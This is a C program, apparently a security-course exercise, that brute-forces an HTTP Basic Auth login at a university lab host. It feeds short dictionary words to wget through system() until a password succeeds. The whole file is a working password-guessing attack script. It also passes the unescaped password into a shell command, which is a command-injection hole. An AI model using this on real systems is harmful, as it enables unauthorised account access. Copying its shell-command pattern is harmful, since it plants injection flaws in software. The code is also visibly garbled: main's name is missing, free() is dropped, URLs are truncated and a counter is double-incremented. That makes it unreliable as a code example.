



#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

#define USERNAME ""
#define URL "sec-crack.cs.rmit.edu./SEC/2"
#define TEST_URL "yallara.cs.rmit.edu./~/secure"
#define MAX_PASSWD_LEN 3

#define DICT_FILE "/usr/share/lib/dict/words"
#define TRUE 1
#define FALSE 0

typedef int (*CrackFuncPtr)(const char*, const char*);

typedef struct node* NodePtr;

typedef struct node
{
	char str[50];
	NodePtr next;	
} Node;

typedef struct list* ListPtr;

typedef struct list
{
	NodePtr head;
	int ctr;
} List;

NodePtr makeNode(const char *str);
void printList(const ListPtr l);
void loadFile(const char fname[], ListPtr l);
void add(ListPtr l, const char *str);
int crackHTTPAuth(const char *username, const char *passwd);
void runDictCrack(const ListPtr l, CrackFuncPtr func);
void freeWList(ListPtr wL);
int isValidPasswd(const char *str);

int ()
{
	List wordList;

	wordList.head = NULL;
	wordList.ctr = 0;

	loadFile(DICT_FILE, &wordList);

	runDictCrack(&wordList, crackHTTPAuth);

	freeWList(&wordList);
	return 0;
	
}



NodePtr makeNode(const char *str)
{
	NodePtr newNode = malloc(sizeof(Node));
	
	if (newNode)
	{
		strncpy(newNode->str, str, strlen(str)+1);
		newNode->next = NULL;	
		return newNode;
	}
	else
	{
		fprintf(stderr, "\nError: Unable  allocate %d btyes memory\n", sizeof(Node));
		return NULL;
	}

}



void add(ListPtr l, const char *str)
{
	NodePtr *iter;
	NodePtr n ;
	n = makeNode(str);

	if (n == NULL)
	{
		exit(1);
	}

	iter = &(l->head);

	if (l->head == NULL)
	{
		l->head = n;
	}
	else
	{
		while (*iter != NULL)
		{
			iter = &((*iter)->next);
		}

	}

	l->ctr = l->ctr+1;

	*iter = n;
	(l->ctr)++;
	
}



void printList(const ListPtr l)
{
	NodePtr iter = l->head;

	while (iter != NULL)
	{
		printf("\n%s", iter->str);
		iter = iter->next;
	}
}




void loadFile(const char fname[], ListPtr l)
{
	FILE *fp;
	char str[50];
	NodePtr p;
	int i=0;
	
	fp = fopen(fname, "r");

	if (fp)
	{
		printf("\nLoading dictionary file...\n");
		while(fgets(str, 50, fp) != NULL)
		{
			if (str[strlen(str)-1] == '\n')
			{
				str[strlen(str)-1] = '\0';
			}

			if (isValidPasswd(str))
			{
				add(l, str);
				i++;
			}
		}
		printf("total %d\n", i);
	}
	else
	{
		fprintf(stderr, "\nError: Cannot  dictionary file\n");
		exit(1);
	}

	fclose(fp);
}



int crackHTTPAuth(const char *username, const char *passwd)
{
	char cmd[3000] = "";
	struct stat fileInfo;
	int success = FALSE;
					
	sprintf(cmd, "wget -O dictTemp -q --http-user=%s --http-passwd=%s --proxy=off %s", 
		username, passwd, URL);

	system(cmd);	
	
	(void)stat("dictTemp", &fileInfo); 
	
	return fileInfo.st_size;
									
}



void runDictCrack(const ListPtr l, CrackFuncPtr func)
{
	NodePtr iter;

	iter = l->head;

	while (iter != NULL)
	{
		if(func(USERNAME, iter->str))
		{
			printf("\nPassword found: %s", iter->str);
			break;
		}
		else
		{
			iter = iter->next;
		}
		
	}
}



void freeWList(ListPtr wL)
{
	NodePtr iter, next;

	iter = wL->head;

	next = iter->next;

	while (iter != NULL)
	{
		next = iter->next;		
		(iter);
		iter = NULL;
		iter = next;
	}
}



int isValidPasswd(const char *str)
{
	int len = strlen(str);
	int i;
	
	if (len <= MAX_PASSWD_LEN)
	{
		for	(i=0; i<len; i++)
		{
			if (!isalpha(str[i]))
			{
				return FALSE;
			}
		}
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
